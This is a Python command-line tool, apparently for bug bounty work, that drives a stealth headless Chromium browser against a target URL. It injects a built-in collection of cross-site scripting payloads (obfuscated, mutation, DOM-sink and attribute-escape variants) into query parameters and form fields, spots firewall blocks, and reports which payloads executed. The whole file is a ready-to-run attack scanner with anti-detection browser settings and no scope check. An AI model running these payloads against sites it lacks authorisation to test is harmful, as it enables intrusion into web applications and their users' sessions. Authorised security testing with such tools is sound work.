#!/usr/bin/env python3
"""Browser-based XSS Hunter - Tests XSS via headless Playwright browser."""

from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import urlencode, urljoin, urlparse, urlunparse, parse_qs

try:
    from playwright.sync_api import sync_playwright, Page, BrowserContext, Dialog
except ImportError:
    print("[!] Playwright not installed. Run: pip install playwright && playwright install chromium")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

PAYLOADS: dict[str, list[str]] = {
    "basic": [
        "<script>alert('XSSMARK')</script>",
        "<img src=x onerror=alert('XSSMARK')>",
        "<svg onload=alert('XSSMARK')>",
        "<body onload=alert('XSSMARK')>",
        "<iframe src=\"javascript:alert('XSSMARK')\">",
    ],
    "event_handlers": [
        "<svg><animate onbegin=alert('XSSMARK')>",
        "<marquee onstart=alert('XSSMARK')>",
        "<video><source onerror=alert('XSSMARK')>",
        "<audio src=x onerror=alert('XSSMARK')>",
        "<details open ontoggle=alert('XSSMARK')>",
        "<input onfocus=alert('XSSMARK') autofocus>",
        "<select onfocus=alert('XSSMARK') autofocus>",
    ],
    "obfuscation": [
        "<ScRiPt>alert('XSSMARK')</sCrIpT>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTU01BUksnKQ=='))>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,77,65,82,75,39,41))</script>",
        "<script>setTimeout(\"alert('XSSMARK')\",0)</script>",
        "&#60;script&#62;alert('XSSMARK')&#60;/script&#62;",
        "%3Cscript%3Ealert('XSSMARK')%3C/script%3E",
    ],
    "dom_sinks": [
        "<img src=x id=a onerror=alert('XSSMARK')>",
        "<div id=d></div><script>document.getElementById('d').innerHTML='<img src=x onerror=alert(\\'XSSMARK\\')>'</script>",
        "<script>document.write('<img src=x onerror=alert(\\'XSSMARK\\')>')</script>",
        "<script>location.hash && eval(location.hash.slice(1))</script>",
    ],
    "mutation": [
        "<noscript><p title=\"</noscript><img src=x onerror=alert('XSSMARK')\">",
        "<math><mtext></mtext><mglyph><style></math><img src=x onerror=alert('XSSMARK')>",
        "<table><td><form><input></table><img src=x onerror=alert('XSSMARK')>",
    ],
    "attribute_escape": [
        "\" onmouseover=\"alert('XSSMARK')\" x=\"",
        "' onmouseover='alert(\"XSSMARK\")' x='",
        "\" autofocus onfocus=\"alert('XSSMARK')\"",
        "javascript:alert('XSSMARK')",
        "data:text/html,<script>alert('XSSMARK')</script>",
    ],
    "js_context": [
        "';alert('XSSMARK')//",
        "\";alert('XSSMARK')//",
        "`${alert('XSSMARK')}`",
        "</script><script>alert('XSSMARK')</script>",
        "\\';alert('XSSMARK')//",
    ],
}

WAF_SIGNATURES = [
    "access denied", "blocked", "reference #", "attention required",
    "cloudflare", "incapsula", "sucuri", "mod_security", "request rejected",
    "403 forbidden", "illegal request", "web application firewall",
]

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class PayloadResult:
    payload: str
    category: str
    vector: str          # "url_param", "form_input", "fragment"
    param: str
    executed: bool = False
    reflected: bool = False
    blocked: bool = False
    waf_detected: bool = False
    dialog_message: str = ""
    error: Optional[str] = None
    test_url: str = ""
    status_code: int = 0


@dataclass
class ScanReport:
    target: str
    program: str
    timestamp: str
    total_tested: int
    executed: list[PayloadResult] = field(default_factory=list)
    reflected: list[PayloadResult] = field(default_factory=list)
    blocked: list[PayloadResult] = field(default_factory=list)
    errors: list[PayloadResult] = field(default_factory=list)

# ---------------------------------------------------------------------------
# Browser setup
# ---------------------------------------------------------------------------

def setup_browser(p):
    """Launch stealth headless Chromium."""
    browser = p.chromium.launch(
        headless=True,
        args=[
            "--disable-blink-features=AutomationControlled",
            "--disable-dev-shm-usage",
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-web-security",
            "--disable-features=IsolateOrigins",
        ],
    )
    context = browser.new_context(
        viewport={"width": 1920, "height": 1080},
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        locale="en-GB",
        timezone_id="Europe/London",
        ignore_https_errors=True,
    )
    context.set_extra_http_headers({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
    })
    return browser, context


def make_page(context: BrowserContext) -> tuple[Page, list[str]]:
    """Create a page with dialog interception. Returns (page, dialog_messages)."""
    page = context.new_page()
    dialog_messages: list[str] = []

    def handle_dialog(dialog: Dialog) -> None:
        dialog_messages.append(dialog.message)
        dialog.dismiss()

    page.on("dialog", handle_dialog)

    # Suppress webdriver flag
    page.add_init_script("""
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3]});
        Object.defineProperty(navigator, 'languages', {get: () => ['en-GB', 'en']});
    """)

    return page, dialog_messages

# ---------------------------------------------------------------------------
# Page analysis helpers
# ---------------------------------------------------------------------------

def find_inputs(page: Page) -> list[dict]:
    """Return all testable input fields on the current page."""
    inputs = []
    selectors = [
        "input[type='text']",
        "input[type='search']",
        "input[type='email']",
        "input[type='url']",
        "input[type='tel']",
        "input:not([type])",
        "textarea",
    ]
    for sel in selectors:
        for el in page.query_selector_all(sel):
            try:
                name = el.get_attribute("name") or ""
                el_id = el.get_attribute("id") or ""
                placeholder = el.get_attribute("placeholder") or ""
                tag = el.evaluate("el => el.tagName.toLowerCase()")
                # Build a stable CSS selector
                if name:
                    css = f"{tag}[name='{name}']"
                elif el_id:
                    css = f"#{el_id}"
                else:
                    css = sel
                inputs.append({
                    "tag": tag,
                    "name": name,
                    "id": el_id,
                    "placeholder": placeholder,
                    "selector": css,
                })
            except Exception:
                continue
    # dedupe by selector
    seen: set[str] = set()
    unique = []
    for inp in inputs:
        if inp["selector"] not in seen:
            seen.add(inp["selector"])
            unique.append(inp)
    return unique


def find_url_params(url: str) -> list[str]:
    """Return query param names from a URL. Falls back to ['q'] if none."""
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    return params if params else ["q"]


def is_waf_block(content: str, status_code: int) -> bool:
    lowered = content.lower()
    if status_code in (403, 406, 429, 503):
        return True
    return any(sig in lowered for sig in WAF_SIGNATURES)


def inject_param(base_url: str, param: str, value: str) -> str:
    """Return URL with param set to value."""
    parsed = urlparse(base_url)
    existing = parse_qs(parsed.query, keep_blank_values=True)
    existing[param] = [value]
    new_query = urlencode({k: v[0] for k, v in existing.items()})
    return urlunparse(parsed._replace(query=new_query))

# ---------------------------------------------------------------------------
# Test functions
# ---------------------------------------------------------------------------

def test_url_param(
    context: BrowserContext,
    base_url: str,
    param: str,
    payload: str,
    category: str,
    verbose: bool = False,
) -> PayloadResult:
    """Inject payload into a URL query parameter and check for execution."""
    page, dialog_messages = make_page(context)
    test_url = inject_param(base_url, param, payload)

    result = PayloadResult(
        payload=payload,
        category=category,
        vector="url_param",
        param=param,
        test_url=test_url,
    )

    try:
        resp = page.goto(test_url, wait_until="domcontentloaded", timeout=12000)
        result.status_code = resp.status if resp else 0
        page.wait_for_timeout(800)

        content = page.content()
        result.waf_detected = is_waf_block(content, result.status_code)
        result.blocked = result.waf_detected

        if dialog_messages:
            result.executed = True
            result.dialog_message = dialog_messages[0]
        elif payload in content or payload.lower() in content.lower():
            result.reflected = True

    except Exception as exc:
        result.error = str(exc)[:200]
    finally:
        try:
            page.close()
        except Exception:
            pass

    if verbose:
        status = "EXEC" if result.executed else ("REFL" if result.reflected else ("BLOK" if result.blocked else "miss"))
        print(f"    [{status}] {param}={payload[:60]}")

    return result


def test_form_input(
    context: BrowserContext,
    base_url: str,
    input_info: dict,
    payload: str,
    category: str,
    verbose: bool = False,
) -> PayloadResult:
    """Fill a form input with payload, submit, and check for execution."""
    page, dialog_messages = make_page(context)
    selector = input_info["selector"]
    param_name = input_info.get("name") or input_info.get("id") or selector

    result = PayloadResult(
        payload=payload,
        category=category,
        vector="form_input",
        param=param_name,
        test_url=base_url,
    )

    try:
        resp = page.goto(base_url, wait_until="domcontentloaded", timeout=12000)
        result.status_code = resp.status if resp else 0

        # Wait for inputs to be available
        page.wait_for_selector(selector, timeout=5000)
        page.fill(selector, payload)

        # Try submit via Enter key first, then look for a submit button
        submitted = False
        try:
            page.press(selector, "Enter")
            page.wait_for_load_state("domcontentloaded", timeout=5000)
            submitted = True
        except Exception:
            pass

        if not submitted:
            for btn_sel in ["button[type='submit']", "input[type='submit']", "button"]:
                btn = page.query_selector(btn_sel)
                if btn:
                    try:
                        btn.click()
                        page.wait_for_load_state("domcontentloaded", timeout=5000)
                        submitted = True
                        break
                    except Exception:
                        continue

        page.wait_for_timeout(800)

        content = page.content()
        result.waf_detected = is_waf_block(content, result.status_code)
        result.blocked = result.waf_detected

        if dialog_messages:
            result.executed = True
            result.dialog_message = dialog_messages[0]
        elif payload in content:
            result.reflected = True

    except Exception as exc:
        result.error = str(exc)[:200]
    finally:
        try:
            page.close()
        except Exception:
            pass

    if verbose:
        status = "EXEC" if result.executed else ("REFL" if result.reflected else ("BLOK" if result.blocked else "miss"))
        print(f"    [{status}] form:{param_name}={payload[:60]}")

    return result

# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------

class BrowserXSSHunter:
    def __init__(
        self,
        target: str,
        program: str = "adhoc",
        categories: list[str] | None = None,
        verbose: bool = False,
        delay: float = 0.3,
        skip_forms: bool = False,
    ):
        self.target = target if target.startswith(("http://", "https://")) else f"https://{target}"
        self.program = program
        self.categories = categories or list(PAYLOADS.keys())
        self.verbose = verbose
        self.delay = delay
        self.skip_forms = skip_forms

    def run(self) -> ScanReport:
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        report = ScanReport(target=self.target, program=self.program, timestamp=timestamp, total_tested=0)

        with sync_playwright() as p:
            browser, context = setup_browser(p)
            try:
                print(f"[*] Target: {self.target}")
                print(f"[*] Categories: {', '.join(self.categories)}")

                # --- Discover inputs ---
                print("[*] Discovering inputs...")
                url_params = find_url_params(self.target)
                form_inputs: list[dict] = []

                if not self.skip_forms:
                    probe_page, _ = make_page(context)
                    try:
                        probe_page.goto(self.target, wait_until="domcontentloaded", timeout=15000)
                        form_inputs = find_inputs(probe_page)
                    except Exception as exc:
                        print(f"[!] Could not load page for input discovery: {exc}")
                    finally:
                        probe_page.close()

                print(f"[*] URL params: {url_params}")
                print(f"[*] Form inputs: {[i['selector'] for i in form_inputs]}")

                # --- Test payloads ---
                all_results: list[PayloadResult] = []

                for category in self.categories:
                    payloads = PAYLOADS.get(category, [])
                    if not payloads:
                        continue
                    print(f"\n[>] Category: {category} ({len(payloads)} payloads)")

                    for payload in payloads:
                        # URL param tests
                        for param in url_params:
                            result = test_url_param(context, self.target, param, payload, category, self.verbose)
                            all_results.append(result)
                            if self.delay:
                                time.sleep(self.delay)

                        # Form input tests
                        if not self.skip_forms:
                            for inp in form_inputs:
                                result = test_form_input(context, self.target, inp, payload, category, self.verbose)
                                all_results.append(result)
                                if self.delay:
                                    time.sleep(self.delay)

            finally:
                context.close()
                browser.close()

        # --- Build report ---
        report.total_tested = len(all_results)
        for r in all_results:
            if r.executed:
                report.executed.append(r)
            elif r.reflected:
                report.reflected.append(r)
            elif r.blocked:
                report.blocked.append(r)
            elif r.error:
                report.errors.append(r)

        return report

# ---------------------------------------------------------------------------
# Output / CLI
# ---------------------------------------------------------------------------

def print_report(report: ScanReport) -> None:
    print("\n" + "=" * 60)
    print(f"  XSS BROWSER SCAN RESULTS")
    print(f"  Target : {report.target}")
    print(f"  Program: {report.program}")
    print("=" * 60)
    print(f"  Total tested : {report.total_tested}")
    print(f"  EXECUTED     : {len(report.executed)}")
    print(f"  Reflected    : {len(report.reflected)}")
    print(f"  Blocked/WAF  : {len(report.blocked)}")
    print(f"  Errors       : {len(report.errors)}")
    print("=" * 60)

    if report.executed:
        print("\n[!!] CONFIRMED XSS EXECUTION:")
        for r in report.executed:
            print(f"  vector : {r.vector}")
            print(f"  param  : {r.param}")
            print(f"  cat    : {r.category}")
            print(f"  payload: {r.payload}")
            print(f"  dialog : {r.dialog_message}")
            print(f"  url    : {r.test_url[:120]}")
            print()

    if report.reflected:
        print(f"\n[+] REFLECTED (not confirmed executed) — {len(report.reflected)} results:")
        for r in report.reflected[:10]:
            print(f"  [{r.category}] {r.vector}:{r.param} — {r.payload[:80]}")

    if report.blocked:
        print(f"\n[-] BLOCKED/WAF — {len(report.blocked)} results (sample):")
        seen_cats: set[str] = set()
        for r in report.blocked:
            if r.category not in seen_cats:
                seen_cats.add(r.category)
                print(f"  category {r.category} blocked (e.g. {r.payload[:60]})")


def save_report(report: ScanReport, output_path: str | None, program: str) -> None:
    """Save JSON report to output path and ~/Shared/bounty_recon/..."""
    data = {
        "target": report.target,
        "program": report.program,
        "timestamp": report.timestamp,
        "total_tested": report.total_tested,
        "summary": {
            "executed": len(report.executed),
            "reflected": len(report.reflected),
            "blocked": len(report.blocked),
            "errors": len(report.errors),
        },
        "executed": [asdict(r) for r in report.executed],
        "reflected": [asdict(r) for r in report.reflected],
        "blocked": [asdict(r) for r in report.blocked],
        "errors": [asdict(r) for r in report.errors],
    }

    # Always save to shared recon dir
    recon_dir = Path.home() / "Shared" / "bounty_recon" / program / "ghost" / "xss_browser"
    recon_dir.mkdir(parents=True, exist_ok=True)
    recon_path = recon_dir / f"xss_browser_{report.timestamp}.json"
    recon_path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    print(f"[+] Report saved: {recon_path}")

    if output_path:
        Path(output_path).write_text(json.dumps(data, indent=2), encoding="utf-8")
        print(f"[+] Report saved: {output_path}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Browser-based XSS Hunter using Playwright headless Chrome.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_browser_hunter.py --target https://example.com/search?q=test
  python xss_browser_hunter.py --target https://example.com --categories basic obfuscation
  python xss_browser_hunter.py --target https://example.com --skip-forms --output results.json
        """,
    )
    parser.add_argument("--target", required=True, help="Target URL to scan")
    parser.add_argument("--program", default="adhoc", help="Bug bounty program name")
    parser.add_argument(
        "--categories",
        nargs="+",
        choices=list(PAYLOADS.keys()),
        default=None,
        help=f"Payload categories to test (default: all). Choices: {', '.join(PAYLOADS.keys())}",
    )
    parser.add_argument("--skip-forms", action="store_true", help="Skip form input testing, only test URL params")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output", help="Output JSON file path")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show per-payload results")

    args = parser.parse_args()

    hunter = BrowserXSSHunter(
        target=args.target,
        program=args.program,
        categories=args.categories,
        verbose=args.verbose,
        delay=args.delay,
        skip_forms=args.skip_forms,
    )

    try:
        report = hunter.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        return 130

    print_report(report)
    save_report(report, args.output, args.program)

    return 0 if report.executed else 1


if __name__ == "__main__":
    sys.exit(main())
